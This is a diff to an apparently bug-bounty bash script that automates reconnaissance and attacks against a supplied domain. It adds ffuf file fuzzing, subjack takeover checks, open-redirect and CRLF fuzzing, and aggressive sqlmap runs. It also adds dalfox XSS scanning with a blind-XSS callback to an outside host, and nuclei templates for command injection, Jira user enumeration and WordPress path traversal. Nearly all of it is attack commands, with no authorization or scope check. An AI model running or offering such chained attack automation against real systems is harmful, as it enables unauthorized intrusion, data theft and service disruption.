@@ -123,6 +123,14 @@ httpx -l "$folder/subdomains.txt" -o "$folder/live_subdomains.txt"
 echo "filter subdomains by keywords..."
 cat "$folder/live_subdomains.txt" | egrep -i "internal|api|test|prod|private|secret|git|login|admin|staging|dev|jira|intranet|vip|portal|register|pass|reset|client|database|server|backup|Credential|database|docker|encryption|security|authorization|authentication|monitoring|logging|certificate|token|integration|endpoint|validation|configuration|deployment" > "$folder/active_priority.txt"
 
+# Arquivos rápidos e suculentos com lista de palavras tomnomnom e ffuf
+echo "ffuf Arquivos suculentos..."
+ffuf -w ~/wordlists/common-paths-tom.txt -u "$domain/FUZZ" -o "$folder/ffuf.txt"
+
+# Extract .js Subdomains
+echo "Extract .js Subdomains..."
+cat "$folder/live_subdomains.txt" | getJS --complete | anew JS.txt
+
 # Executando gau para encontrar endpoints
 echo "Finding endpoints with gau..."
 cat "$folder/live_subdomains.txt" | gau --threads 10 --o "$folder/Endpoints.txt"
@@ -133,7 +141,7 @@ cat "$folder/live_subdomains.txt" | waybackurls > "$folder/Endpoints.txt"
 
 # Executando gospider
 echo "Executando gospider..."
-gospider -S "$folder/live_subdomains.txt" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg)" --other-source | grep "code-200" | awk '{print $5}' > "$folder/Endpoints.txt"
+gospider -S "$folder/live_subdomains.txt" -c 10 -d 5 --blacklist ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt)" --other-source | grep "code-200" | awk '{print $5}' > "$folder/Endpoints.txt"
 
 # Executando katana 
 echo "Finding endpoints with katana..."
@@ -161,6 +169,20 @@ cat "$folder/EndpointsL.txt" | gf sqli | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2
 cat sqli.txt | xargs -P 30 -I % bash -c "python3 ~/tools/sqlmap/sqlmap.py -u % -b --batch --disable-coloring --random-agent --risk 3 --level 5 --output-dir="$folder/sqlmapVUL.txt" 2> /dev/null" &> /dev/null
 mv sqli.txt "$folder/sqli.txt"
 
+# takeover vulnerabilities
+echo "Finding takeover vulnerabilities..."
+subjack -w "$folder/subdomains.txt" -t 20 -a -o "$folder/takeover.txt"
+
+# openredirect vulnerabilities
+echo "Finding openredirect vulnerabilities..."
+cat "$folder/EndpointsL.txt" | gf redirect | sed "s/'\|(\|)//g" | qsreplace "FUZZ" 2> /dev/null | anew -q "$folder/openredirect.txt" 
+cat "$folder/openredirect.txt" | nuclei -t ~/nuclei-templates/http/vulnerabilities/generic/open-redirect.yaml -o "$folder/open-redirectVUL.txt" 
+rm "$folder/openredirect.txt"
+
+# crlf vulnerabilities
+echo "Finding crlfuzz  vulnerabilities..."
+crlfuzz -l "$folder/live_subdomains.txt" -c 50 -s | anew "$folder/crlf.txt" &> /dev/null
+
 #  XSS vulnerabilities
 echo "Finding XSS vulnerabilities with gf..."
 cat "$folder/EndpointsL.txt" | gf xss >> "$folder/xss.txt"
@@ -171,14 +193,23 @@ cat "$folder/xss.txt" | Gxss -p khXSS -o "$folder/XSS_Ref.txt"
 
 # Analisando referências XSS com dalfox
 echo "Analyzing XSS references with dalfox..."
-dalfox file "$folder/XSS_Ref.txt" -o "$folder/Vulnerable_XSS.txt"
+dalfox file "$folder/XSS_Ref.txt" pipe --skip-bav --mining-dom --deep-domxss --ignore-return -b 'https://mrxbugcom.bxss.in' --follow-redirects  -o "$folder/Vulnerable_XSS.txt"
 
 # Usando Running Nuclei Severity
 echo "Running Nuclei Severity..."
-cat "$folder/live_subdomains.txt" | nuclei -severity low,medium,high,critical -o "$folder/severity.txt"
+cat "$folder/live_subdomains.txt" | nuclei -severity low,medium,high,critical -o "$folder/severityNUclei.txt" -H "User-Agent:Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0"
 
-# Usando Running Nuclei Custom Template
-echo "Running Nuclei Custom Templat..."
-cat "$folder/live_subdomains.txt" | nuclei -t ~/nuclei-templates/siteminder-dom-xss.yaml -o "$folder/nucleiT.txt"
+# Usando Nuclei Custom Template
+# wget https://raw.githubusercontent.com/pikpikcu/nuclei-templates/master/vulnerabilities/command-injection.yaml
+echo "Running Nuclei command-injection..."
+cat "$folder/live_subdomains.txt" | nuclei -t ~/nuclei-templates/command-injection.yaml -o "$folder/command-injection.txt"
 
+# Usando Nuclei Custom Template
+# wget https://raw.githubusercontent.com/medbsq/ncl/main/templates/jira_user_piker.yaml
+echo "Running Nuclei Jira Unauthenticated User Picker..."
+cat "$folder/live_subdomains.txt" | nuclei -t ~/nuclei-templates/jira_user_piker.yaml -o "$folder/jira_user_piker.txt"
 
+# Usando Nuclei Custom Template
+# wget https://raw.githubusercontent.com/im403/nuclei-temp/master/high/wordpress-duplicator-path-traversal.yaml
+echo "Running Nuclei WordPress duplicator Path Traversal..."
+cat "$folder/live_subdomains.txt" | nuclei -t ~/nuclei-templates/wordpress-duplicator-path-traversal.yaml  -o "$folder/wordpress-path-traversal.txt"
